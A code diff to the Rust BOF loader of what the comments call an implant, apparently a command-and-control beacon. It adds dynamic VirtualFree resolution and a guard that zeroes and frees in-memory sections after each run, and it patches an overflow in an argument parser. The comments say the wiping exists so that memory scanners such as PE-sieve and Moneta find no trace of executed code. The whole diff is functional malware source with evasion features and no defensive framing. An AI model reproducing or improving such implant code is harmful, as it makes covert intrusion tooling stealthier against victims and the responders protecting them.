@@ -38,6 +38,9 @@ use nyx_protocol::Response;
 
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
+/// `MEM_RELEASE` — passed to `VirtualFree` to release a whole region back to the
+/// OS. With this flag `dwSize` must be 0 and `lpAddress` the allocation base.
+const MEM_RELEASE: u32 = 0x8000;
 const PAGE_READWRITE: u32 = 0x04;
 const PAGE_EXECUTE_READ: u32 = 0x20;
 /// Kept for reference / future use (the brief RWX write-window flag). The
@@ -52,6 +55,10 @@ const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
 
 type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
 type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+/// `BOOL VirtualFree(LPVOID, SIZE_T, DWORD)`. Counterpart of `VirtualAlloc` —
+/// used by [`SectionAlloc`] to release BOF section regions after `go()` runs.
+/// `MEM_RELEASE` with `dwSize=0` frees the whole region.
+type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
 
 unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
     let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
@@ -59,6 +66,10 @@ unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
 }
 unsafe fn virtual_protect() -> Option<VirtualProtectFn> {
     let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
+    Some(core::mem::transmute(a))
+}
+unsafe fn virtual_free() -> Option<VirtualFreeFn> {
+    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree")?;
     Some(core::mem::transmute(a))
 }
 
@@ -366,14 +377,26 @@ pub unsafe extern "C" fn BeaconDataExtract(d: *mut DataParseState, size: *mut i3
         return core::ptr::null();
     }
     let len = *((*d).buffer as *const i32);
-    if len < 0 || left < 4 + len {
+    if len < 0 {
+        // Negative length is malformed (attacker-controlled i32).
+        if !size.is_null() {
+            *size = 0;
+        }
+        return core::ptr::null();
+    }
+    // Bounds check in usize to avoid i32 overflow: when `len` ≈ i32::MAX the
+    // old `left < 4 + len` wrapped negative and bypassed the guard → OOB read.
+    // `left >= 4` is already established above, so it's a safe positive i32.
+    let len_u = len as usize;
+    let need = 4usize.checked_add(len_u).unwrap_or(usize::MAX);
+    if need > left as usize {
         if !size.is_null() {
             *size = 0;
         }
         return core::ptr::null();
     }
     let p = (*d).buffer.add(4);
-    (*d).buffer = p.add(len as usize);
+    (*d).buffer = p.add(len_u);
     if !size.is_null() {
         *size = len;
     }
@@ -645,6 +668,107 @@ unsafe fn alloc_near(alloc: VirtualAllocFn, anchor: usize, sz: usize) -> *mut c_
 }
 
 // ============================================================================
+// RAII guard: tracks each VirtualAlloc'd section so EVERY return path (alloc
+// failure mid-loop, reloc error, VirtualProtect -> RX failure, missing `go`,
+// the normal post-`go()` return) frees + zeroes the section regions. Without
+// this every BOF execution permanently leaked all section allocations (~36 MiB
+// at 1 BOF/min) and left the RX pages holding relocated .text — a prime
+// forensic target for PE-sieve/Moneta. The guard's Drop zeroes each region
+// (RW, never the live RX mapping) then releases it with VirtualFree.
+// ============================================================================
+
+/// One mapped BOF section: base, page-rounded size, and whether step 4 flipped
+/// it RX (so we flip it back to RW before zeroing — writing RX faults).
+#[derive(Clone, Copy)]
+struct SectionAlloc {
+    base: u64,
+    size: usize,
+    is_rx: bool,
+}
+
+/// RAII owner of the section regions. On drop: for each section, flip RX→RW if
+/// needed, RtlZeroMemory it, then VirtualFree(MEM_RELEASE). Best-effort — a
+/// missing VirtualFree/VirtualProtect export logs a diag mark and continues, so
+/// a partial-cleanup run still frees everything it can.
+struct SectionGuard {
+    sections: Vec<SectionAlloc>,
+    free: VirtualFreeFn,
+    protect: VirtualProtectFn,
+}
+
+impl SectionGuard {
+    /// Release ownership back to the caller (disarm the guard) once it has
+    /// successfully freed — currently unused but keeps the Drop-after-cleanup
+    /// pattern explicit. (The normal path goes through `Drop`.)
+    #[allow(dead_code)]
+    fn disarm(mut self) -> Vec<SectionAlloc> {
+        core::mem::take(&mut self.sections)
+    }
+}
+
+impl Drop for SectionGuard {
+    fn drop(&mut self) {
+        // SAFETY: the section regions were VirtualAlloc'd by us (same primitive
+        // as `free`); the beacon is single-threaded so there's no race. We zero
+        // while writable (RX flipped back to RW first) BEFORE releasing, so no
+        // byte of relocated BOF code/data survives in the page cache. The guard
+        // runs after `go()` has returned (see `run`), so no shim holds a live
+        // pointer into these regions.
+        for s in &self.sections {
+            if s.base == 0 {
+                continue;
+            }
+            unsafe {
+                let p = s.base as *mut c_void;
+                // RX sections were flipped to PAGE_EXECUTE_READ in step 4 —
+                // writing them now would fault, so flip back to RW first.
+                if s.is_rx {
+                    let mut old: u32 = 0;
+                    if (self.protect)(p, s.size, PAGE_READWRITE, &mut old) == 0 {
+                        // VirtualProtect failed (shouldn't happen for our own
+                        // region); skip the zero but still attempt the free.
+                        crate::entry::diag_mark(b"WARN_BOF_REPROTECT_RW");
+                    } else {
+                        RtlZeroMemory(p, s.size);
+                    }
+                } else {
+                    RtlZeroMemory(p, s.size);
+                }
+                // MEM_RELEASE releases the entire region; dwSize MUST be 0 and
+                // lpAddress must be the allocation base — which `base` is (it's
+                // exactly what VirtualAlloc returned in `alloc_near`).
+                if (self.free)(p, 0, MEM_RELEASE) == 0 {
+                    crate::entry::diag_mark(b"WARN_BOF_SECTION_FREE");
+                }
+            }
+        }
+    }
+}
+
+/// `void RtlZeroMemory(PVOID, SIZE_T)` — fill a region with zeros. Backed by
+/// the kernel32 `RtlZeroMemory` export when present; otherwise a hand-rolled
+/// zero loop. Used by [`SectionGuard`] to wipe a section's bytes before freeing
+/// them so no relocated BOF code/data survives for a memory scanner to find.
+#[allow(non_snake_case)]
+unsafe fn RtlZeroMemory(ptr: *mut c_void, len: usize) {
+    // kernel32 exports RtlZeroMemory (a memset-0 wrapper) on modern Windows.
+    // Fall back to a hand-rolled zero loop so a missing export still wipes the
+    // region.
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"RtlZeroMemory") {
+        type RtlZero = unsafe extern "system" fn(*mut c_void, usize);
+        let f: RtlZero = core::mem::transmute(addr);
+        f(ptr, len);
+        return;
+    }
+    // Fallback: hand-rolled zero. SAFETY: caller guarantees [ptr, ptr+len) is a
+    // valid writable region we own.
+    let bytes = core::slice::from_raw_parts_mut(ptr as *mut u8, len);
+    for b in bytes.iter_mut() {
+        *b = 0;
+    }
+}
+
+// ============================================================================
 // Loader: parse → W^X map → reloc → resolve entry → call.
 // ============================================================================
 
@@ -694,6 +818,28 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         Some(f) => f,
         None => return Response::Err(String::from("VirtualProtect unresolved")),
     };
+    // VirtualFree is the cleanup counterpart of VirtualAlloc — used by the
+    // SectionGuard to release every section region when `run` returns. The
+    // guard is built eagerly (before any allocation) so that even if a later
+    // export resolution fails every region pushed so far is freed.
+    let free = match unsafe { virtual_free() } {
+        Some(f) => f,
+        None => return Response::Err(String::from("VirtualFree unresolved")),
+    };
+
+    // RAII owner of every VirtualAlloc'd section region. Its Drop zeroes each
+    // region (RX flipped back to RW first) then releases it with
+    // VirtualFree(MEM_RELEASE) — this is the leak fix: previously every BOF
+    // execution permanently leaked all section allocations and left the RX
+    // pages holding relocated .text. The guard owns the regions from the moment
+    // each is pushed until the function returns (any path). `bases`/`sizes`
+    // still mirror what the guard tracks, for the existing symbol/reloc/entry
+    // lookups below.
+    let mut guard = SectionGuard {
+        sections: Vec::with_capacity(coff.sections.len()),
+        free,
+        protect,
+    };
 
     // Anchor near the implant image so REL32 calls from BOF .text to the
     // Beacon-API shims (in the implant image) span < 2 GiB. Without this,
@@ -723,6 +869,13 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         bases.push(addr);
         sizes.push(sz);
         is_code.push(s.characteristics & SCN_MEM_EXECUTE != 0);
+        // Track the region in the guard as NOT-yet-RX; step 4 marks the code
+        // sections RX so the Drop knows to flip them back before zeroing.
+        guard.sections.push(SectionAlloc {
+            base: addr,
+            size: sz,
+            is_rx: false,
+        });
     }
 
     // 2. Map defined symbols → absolute addresses (section_base + value).
@@ -760,7 +913,8 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         }
     }
 
-    // 4. Flip code sections to RX (W^X: close the write window).
+    // 4. Flip code sections to RX (W^X: close the write window). Also record
+    //    is_rx in the guard so Drop flips them back to RW before zeroing.
     for i in 0..bases.len() {
         if is_code[i] {
             let mut old: u32 = 0;
@@ -775,6 +929,7 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
             {
                 return Response::Err(String::from("VirtualProtect -> RX failed"));
             }
+            guard.sections[i].is_rx = true;
         }
     }
 
@@ -788,9 +943,12 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
     }
     let entry_addr = bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;
 
-    // 6. Set up capture + args, call go(), capture output.
+    // 6. Set up capture + args, call go(), capture output. The SectionGuard is
+    //    dropped when `run` returns (here or at any error above), so the section
+    //    regions are zeroed + freed AFTER go() has returned — by which point no
+    //    Beacon-API shim holds a live pointer into them.
     let args_blob = pack_args(args);
-    unsafe {
+    let resp = unsafe {
         reset_capture();
         if !args_blob.is_empty() {
             ARGS_PTR = args_blob.as_ptr();
@@ -800,5 +958,10 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
         go();
         let out = captured_output().to_vec();
         Response::BofOutput(out)
-    }
+    };
+    // `guard` drops here: every section region is zeroed (RX flipped back to RW
+    // first) then released with VirtualFree(MEM_RELEASE). Best-effort on a
+    // missing RtlZeroMemory/VirtualProtect export (diag mark + still free).
+    drop(guard);
+    resp
 }
